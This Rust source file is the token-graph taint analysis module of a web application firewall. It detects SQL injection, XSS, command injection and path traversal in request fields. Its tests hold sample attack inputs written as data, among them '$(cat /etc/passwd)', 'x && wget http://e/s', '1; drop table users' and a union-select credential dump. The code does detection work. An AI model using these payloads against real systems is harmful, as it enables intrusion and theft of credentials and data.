//! FR2 — Token graph + taint reachability.
//!
//! We tokenize the normalized payload across several grammars (SQL / HTML /
//! shell / path), build a small graph over the tokens, mark the whole field as
//! a tainted source, locate dangerous *sink* constructs, and check whether a
//! source→sink path exists. Because the analysis is over token *structure*
//! rather than literal strings, semantics-preserving mutations (case,
//! whitespace, comments, operator swaps) do not hide the attack — this is the
//! engine's mutation-robustness, done honestly and bounded.

mod tokenize;
pub mod sinks;

pub use tokenize::{tokenize, Token, TokenKind};

use crate::judgment::{Family, Pattern};
use crate::normalize::Normalized;
use sinks::{Disabled, Hits, SinkCtx};

/// Caps so adversarial input can never blow up memory/CPU.
const MAX_NODES: usize = 4096;

/// Tokens shared by consecutive windows, so a construct cannot hide on a seam.
pub const WINDOW_OVERLAP: usize = 64;

#[derive(Debug, Clone)]
pub struct Analysis {
    /// Sink patterns that are actually reachable from the tainted source.
    pub reachable: Vec<Pattern>,
    /// Sinks present but not conclusively reachable (weaker signal).
    pub latent: Vec<Pattern>,
    pub graph_truncated: bool,
}

impl Analysis {
    pub fn is_empty(&self) -> bool {
        self.reachable.is_empty() && self.latent.is_empty()
    }
}

/// How to run the token graph over one field.
pub struct GraphOpts<'a> {
    pub disabled: &'a Disabled,
    /// Token windows to analyze before giving up: 4096-token windows overlapping
    /// by 64. When they run out, `graph_truncated` is set and the shield emits
    /// `limit.graph-truncated`.
    pub max_windows: usize,
}

/// Analyze one normalized field value with every construct enabled.
pub fn analyze(text: &str) -> Analysis {
    analyze_with(text, &GraphOpts { disabled: &Disabled::default(), max_windows: 32 })
}

/// Analyze one normalized field value, skipping disabled constructs.
pub fn analyze_with(text: &str, opts: &GraphOpts) -> Analysis {
    let tokens = tokenize(text);

    // At the WAF boundary the entire field is attacker-controlled, so any
    // structural sink we find *is* reachable from the tainted source. We still
    // distinguish "formed a dangerous construct" (reachable) from "contains a
    // lone dangerous token" (latent) to keep false positives down.
    let mut hits = Hits::new(opts.disabled);
    // Overlapping windows so a construct cannot hide on a window seam. Text-level
    // checks inside the sinks see the whole field in every window; `Hits`
    // de-duplicates what they report.
    let mut start = 0;
    let mut windows = 0;
    let mut graph_truncated = false;
    loop {
        let end = (start + MAX_NODES).min(tokens.len());
        let cx = SinkCtx { tokens: &tokens[start..end], text };
        sinks::sql::detect(&cx, &mut hits);
        sinks::xss::detect(&cx, &mut hits);
        sinks::shell::detect(&cx, &mut hits);
        sinks::path::detect(&cx, &mut hits);
        windows += 1;
        if end == tokens.len() {
            break;
        }
        if windows >= opts.max_windows {
            graph_truncated = true;
            break;
        }
        // Reached only when end == start + MAX_NODES, so this cannot underflow
        // and always advances (MAX_NODES > WINDOW_OVERLAP).
        start = end - WINDOW_OVERLAP;
    }

    Analysis {
        reachable: hits.reachable,
        latent: hits.latent,
        graph_truncated,
    }
}

/// Analyze a normalized field. When a comment was stripped, also analyze the
/// field with comments kept (`n.kept`) and add the constructs formed there,
/// dropping latents of their families: stripping drops the rest of a line or
/// field, and those bytes must still reach the sinks (DQ5). Only formed
/// constructs are taken from the kept view, so it adds no latent noise, and
/// none of the SQL family: SQL reads comments as comments, so its sinks read
/// the stripped text only.
pub fn analyze_field(n: &Normalized, opts: &GraphOpts) -> Analysis {
    let mut a = analyze_with(&n.text, opts);
    if let Some(kept) = &n.kept {
        let b = analyze_with(kept, opts);
        a.graph_truncated |= b.graph_truncated;
        for p in b.reachable.into_iter().filter(|p| p.family != Family::Sqli) {
            if !a.reachable.iter().any(|q| q.name == p.name) {
                a.latent.retain(|q| q.family != p.family);
                a.reachable.push(p);
            }
        }
    }
    a
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::judgment::Family;

    #[test]
    fn attack_after_padding_is_found_in_a_later_window() {
        let text = format!("{} 1 union select a,b from users", ",".repeat(4100));
        let opts = GraphOpts { disabled: &sinks::Disabled::default(), max_windows: 32 };
        let a = analyze_with(&text, &opts);
        assert!(a.reachable.iter().any(|p| p.name == "sqli.union-select"), "{a:?}");
        assert!(!a.graph_truncated);
    }

    #[test]
    fn running_out_of_windows_is_reported() {
        let text = ",".repeat(10_000);
        let opts = GraphOpts { disabled: &sinks::Disabled::default(), max_windows: 2 };
        assert!(analyze_with(&text, &opts).graph_truncated);
    }

    fn fams(a: &Analysis) -> Vec<(Family, String)> {
        a.reachable
            .iter()
            .map(|p| (p.family, p.name.clone()))
            .collect()
    }

    #[test]
    fn union_select_detected() {
        let a = analyze("-1 union select username,password from users");
        assert!(fams(&a).iter().any(|(f, _)| *f == Family::Sqli));
    }

    #[test]
    fn tautology_detected() {
        assert!(!analyze("admin' or 1=1 -- ").reachable.is_empty());
        assert!(!analyze("' or 'a'='a").reachable.is_empty());
    }

    #[test]
    fn script_detected() {
        let a = analyze("<script>alert(1)</script>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn event_handler_detected() {
        let a = analyze("<svg onload=alert(1)>");
        assert!(a.reachable.iter().any(|p| p.family == Family::Xss));
    }

    #[test]
    fn command_injection_detected() {
        let a = analyze("127.0.0.1; cat /etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::CommandInjection));
    }

    #[test]
    fn traversal_detected() {
        let a = analyze("../../../../etc/passwd");
        assert!(a
            .reachable
            .iter()
            .any(|p| p.family == Family::PathTraversal));
    }

    #[test]
    fn attribute_breakout_xss_detected() {
        // M3: event handler via attribute breakout, no new tag.
        let a = analyze("x\" onmouseover=alert(1)");
        assert!(
            a.reachable.iter().any(|p| p.family == Family::Xss),
            "missed attr-breakout xss: {:?}",
            a
        );
    }

    #[test]
    fn benign_prose_is_clean() {
        // Values that used to produce false-positive *reachable* hits (H2).
        for s in [
            "please select your favorite number, mine is 7",
            "i wrote about whether 1 = 1 in my math blog",
            "salt and pepper = tasty",
            "price and qty = total",
            "cat;dog",            // pet store search, not command injection
            "it's blue or green = nice",
            "the union of two sets",
        ] {
            let a = analyze(s);
            assert!(
                a.reachable.is_empty(),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
    }

    #[test]
    fn jquery_dollar_paren_is_not_cmdi() {
        for s in ["$(document).ready(function(){})", "$('#id').hide()"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().all(|p| p.family != Family::CommandInjection),
                "false positive on {s:?}: {:?}",
                a.reachable
            );
        }
        for s in ["$(cat /etc/passwd)", "`whoami`", "$(/bin/cat /etc/passwd)", "x=`id`"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.name == "cmd.cmd-substitution"),
                "missed substitution on {s:?}: {:?}",
                a
            );
        }
    }

    #[test]
    fn every_emitted_pattern_is_a_registered_id() {
        for s in [
            "-1 union select username,password from users",
            "admin' or 1=1 -- ",
            "1; drop table users",
            "select sleep(5) pg_sleep benchmark updatexml extractvalue load_file",
            "<script>alert(1)</script>",
            "<svg onload=alert(1)> javascript:x",
            "<b>x</b>",
            "127.0.0.1; cat /etc/passwd",
            "$(cat /etc/passwd)",
            "a;b",
            "../../../../etc/passwd",
            "../x",
        ] {
            let a = analyze(s);
            for p in a.reachable.iter().chain(a.latent.iter()) {
                assert!(sinks::lookup(&p.name).is_some(), "unregistered pattern {:?} from {s:?}", p.name);
            }
        }
    }

    #[test]
    fn command_injection_still_caught_after_fp_fix() {
        for s in ["127.0.0.1; cat /etc/passwd", "foo | whoami", "x && wget http://e/s"] {
            let a = analyze(s);
            assert!(
                a.reachable.iter().any(|p| p.family == Family::CommandInjection),
                "missed cmdi on {s:?}: {:?}",
                a
            );
        }
    }

    fn field(s: &str, off: &[&str]) -> Analysis {
        let disabled = Disabled::resolve(&off.iter().map(|x| x.to_string()).collect::<Vec<_>>());
        let opts = crate::normalize::Options { disabled: disabled.clone(), ..Default::default() };
        let n = crate::normalize::normalize(s, &opts);
        analyze_field(&n, &GraphOpts { disabled: &disabled, max_windows: 32 })
    }

    fn reached(a: &Analysis, id: &str) -> bool {
        a.reachable.iter().any(|p| p.name == id)
    }

    #[test]
    fn a_comment_does_not_hide_the_text_after_it() {
        // A line comment, a `#` comment and an unterminated block comment each
        // used to drop the rest of the field before any sink saw it.
        for s in ["x -- ;id", "x #;id", "x /* ;id", "/tmp/*;wget x"] {
            assert!(reached(&field(s, &[]), "cmd.chained-command"), "{s:?}");
            assert!(!reached(&field(s, &["decode.keep-comments"]), "cmd.chained-command"), "{s:?} with the view off");
        }
    }

    #[test]
    fn the_kept_view_adds_only_formed_constructs() {
        // A benign comment changes nothing; the kept view's latents are not taken.
        let a = field("price -- per unit; see notes", &[]);
        assert!(a.reachable.is_empty(), "{a:?}");
        assert_eq!(a.latent.len(), field("price -- per unit; see notes", &["decode.keep-comments"]).latent.len());
        // No comment: there is no kept view at all.
        let n = crate::normalize::normalize("plain value", &Default::default());
        assert!(n.kept.is_none());
    }

    #[test]
    fn the_kept_view_takes_no_sql_constructs() {
        let a = field("x -- ;select 1", &[]);
        assert!(!a.reachable.iter().any(|p| p.family == Family::Sqli), "{a:?}");
    }

    #[test]
    fn the_kept_view_replaces_latents_of_the_family_it_forms() {
        let a = field("x -- ;id", &[]);
        assert!(!a.latent.iter().any(|p| p.family == Family::CommandInjection), "{a:?}");
    }
}
